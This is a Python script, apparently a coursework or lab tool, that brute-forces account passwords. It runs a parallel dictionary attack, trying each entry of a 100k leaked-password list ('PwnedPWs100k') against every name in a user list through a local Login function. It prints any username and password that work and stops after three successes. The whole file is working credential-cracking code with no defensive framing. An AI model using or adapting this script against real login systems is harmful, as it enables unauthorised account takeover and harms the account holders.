import os
import time
from multiprocessing import Manager, Pool
from LoginFunc import Login


def breakPassword(user, pw, namespace):
    namespace.x += 1
    if(namespace.x % 10000 == 0):
        print(user + " at iteration: " + str(namespace.x))
    output = Login(user, pw)
    if(output):
        print("Successful User: " + user)
        print("Successful User Password: " + pw)
        namespace.found += 1
        event.set()
    if(pw == "crossroad" ):
        print("End of File")
        event.set()
   
if __name__ == "__main__":


    start_time = time.time()
   
    with Manager() as manager:
       
        event = manager.Event()
        namespace = manager.Namespace()
        namespace.found = 0 


        pwsFile = open('PwnedPWs100k', 'r')
        pws = pwsFile.readlines()
        pws = [pw.strip('\n') for pw in pws]
       
        userFile = open('gang', 'r')
        users = userFile.readlines()
        users = [user.strip('\n') for user in users]
       
        for user in users:
           
            namespace.x = 0
            pool = Pool()


            for pw in pws:
                pool.apply_async(breakPassword, args=(user, pw, namespace,))
           
            pool.close()
            event.wait()
            pool.terminate()
            pool.join()
            event.clear()
            if(namespace.found >=  3):
                break            


        print('Done', flush=True)
        print("--- %s seconds ---" % (time.time() - start_time))